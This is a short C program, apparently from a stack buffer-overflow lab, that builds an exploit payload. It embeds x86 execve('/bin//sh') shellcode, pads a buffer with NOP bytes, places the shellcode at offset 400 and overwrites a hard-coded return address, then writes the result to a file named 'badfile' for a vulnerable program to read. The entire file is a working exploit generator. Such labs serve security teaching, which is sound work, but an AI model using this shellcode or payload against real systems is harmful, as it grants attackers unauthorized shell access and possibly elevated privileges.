/* stack_shell.c  */

/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[]=
	"\x31\xc0"             /* xorl    %eax,%eax              */
	"\x50"                 /* pushl   %eax                   */
	"\x68""//sh"           /* pushl   $0x68732f2f            */
	"\x68""/bin"           /* pushl   $0x6e69622f            */
	"\x89\xe3"             /* movl    %esp,%ebx              */
	"\x50"                 /* pushl   %eax                   */
	"\x53"                 /* pushl   %ebx                   */
	"\x89\xe1"             /* movl    %esp,%ecx              */
	"\x99"                 /* cdq                            */
	"\xb0\x0b"             /* movb    $0x0b,%al              */
	"\xcd\x80"             /* int     $0x80                  */
;

void main(int argc, char **argv)
{
	char buffer[512];
	FILE *badfile;

	/* Initialize buffer with 0x90 (NOP instruction) */
	memset(&buffer, 0x90, sizeof(buffer));

	/* TODO: You need to fill the buffer with appropriate 
	   contents here. To set an address at location X
	   with respect to the buffer, use the following format: 
	   *(long *) &buffer[X] = addr; */
	//printf("shellsize: %d", sizeof(shellcode));
	//int i = 0;
	//int offset = sizeof(buffer)-sizeof(shellcode)-1;
	//for(; i < sizeof(shellcode); i++){
	//	*(long*) &buffer[i + 400] = shellcode[i];
	//} // addr = addr of code in buffer
	memcpy(&buffer[400], shellcode, sizeof(shellcode));
	*(long*) &buffer[24] = 0xbffff090 + 400; // @ code in buffer	
	/* Save the contents to the file "badfile" */
	badfile = fopen("./badfile", "w");
	fwrite(buffer, sizeof(buffer), 1, badfile);
	fclose(badfile);
}

